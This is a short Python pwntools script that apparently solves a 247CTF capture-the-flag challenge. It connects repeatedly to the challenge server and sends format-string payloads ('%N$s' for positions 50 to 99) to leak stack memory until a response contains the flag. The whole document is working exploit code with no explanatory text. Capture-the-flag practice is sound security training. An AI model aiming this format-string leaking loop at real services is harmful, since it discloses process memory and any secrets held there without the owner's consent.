from pwn import *

url = "6d3d1801411b6435.247ctf.com"
port = 50346

for i in range(50, 100):
    conn = remote(url, port)
    fstring = "%" + str(i) + "$s\n"
    p = conn.recvline()
    p = conn.recvline()
    conn.send(fstring)
    try:
        p = conn.recvline()
        if b'247CTF' in p:
            print(p)
            print(i)
            break
    except EOFError:
        continue
    conn.close()
